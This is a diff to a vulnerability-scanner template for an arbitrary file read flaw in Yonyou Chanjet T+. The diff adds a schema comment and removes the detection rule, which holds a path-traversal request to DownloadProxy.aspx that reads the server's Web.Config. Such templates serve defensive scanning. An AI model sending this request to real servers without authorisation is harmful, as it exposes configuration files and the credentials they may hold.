@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: yonyou-chanjet-tplus-read-file
 
 info:
@@ -9,11 +10,3 @@ info:
     app="畅捷通-TPlus"
   reference:
     - http://wiki.peiqi.tech/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT+%20DownloadProxy.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
-    expression: response.status == 200 && response.body.bcontains(b'<?xml') && response.body.bcontains(b'<configuration>')
-expression: r0()
